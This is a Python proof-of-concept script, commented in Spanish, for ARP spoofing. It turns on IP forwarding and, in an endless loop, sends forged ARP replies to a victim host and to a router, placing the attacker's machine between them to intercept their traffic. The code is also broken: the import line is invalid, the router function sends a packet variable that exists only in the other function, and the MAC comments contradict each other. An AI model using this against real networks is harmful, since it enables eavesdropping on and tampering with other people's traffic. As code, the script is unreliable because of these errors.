import ../spoofeada
import time
import os

# Prueba de concepto de la spoofeada

# Sin este comando en la maquina pirania, la victima no tendria internet
permitir_forwarding = 'sysctl -w net.ipv4.ip_forward=1'
os.system(permitir_forwarding)

def victima_spoofeada():
  """Testea el spoofeo a la victima
  """
  
  spoofeada_padre = spoofeada.crear_paquete_arp_fake("192.168.0.129", # Ip de la victima
                                                     "00:0C:29:BE:47:14", # Mac de la victima
                                                     "192.168.0.2", # Ip del router
                                                     "00:0c:29:90:79:02") # MAC del router
  
  spoofeada.mandar_paquete_arp(spoofeada_padre)
  
  return None

def router_spoofeado():
  """Testea el spoofeo al router
  """
  spoofeada_madre = spoofeada.crear_paquete_arp_fake("192.168.0.1", # Ip del router
                                                     "00:0C:29:BE:47:14", # Mac del router
                                                     "192.168.0.66", # ip fake del pirania
                                                     "00:0c:29:90:79:02") # Mac del pirania
  
  spoofeada.mandar_paquete_arp(spoofeada_padre)
  
  return None
  
if __name__ == "__main__":
  try:
    while True:
      victima_spoofeada()
      router_spoofeado()
      time.sleep(2)
  except KeyboardInterrupt as err:
    print("Algo hiciiiiste, buen trabajo!")
